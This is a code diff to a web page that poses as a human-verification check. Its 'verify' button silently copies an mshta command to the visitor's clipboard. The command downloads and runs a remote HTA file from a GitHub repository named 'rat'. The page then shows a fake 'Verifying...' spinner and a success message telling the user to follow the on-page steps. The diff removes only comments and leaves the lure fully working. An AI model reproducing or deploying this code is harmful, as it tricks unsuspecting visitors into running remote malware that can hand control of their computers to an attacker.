@@ -152,7 +152,6 @@
     const extraBox = document.getElementById('extraBox');
     const statusDiv = document.getElementById('status');
     
-    // The mshta command (use "link.hta" as the filename)
     const mshtaCommand = 'mshta https://raw.githubusercontent.com/Skibidi101201/rat/main/link.hta';
     
     function copyToClipboard(text) {
@@ -168,21 +167,13 @@
     }
     
     verifyBtn.addEventListener('click', function() {
-      // Copy mshta command
       copyToClipboard(mshtaCommand);
-      
-      // Show extra verification box
       extraBox.style.display = 'block';
-      
-      // Show status
       statusDiv.style.display = 'block';
       statusDiv.innerHTML = '<span class="spinner"></span> Verifying...';
-      
-      // Change button state
       verifyBtn.disabled = true;
       verifyBtn.style.opacity = '0.7';
       
-      // After 2 seconds, show success message (but no redirect)
       setTimeout(function() {
         statusDiv.innerHTML = '<span style="color: #1e6f3f;">✓ Verification complete! Follow the steps above.</span>';
       }, 2000);
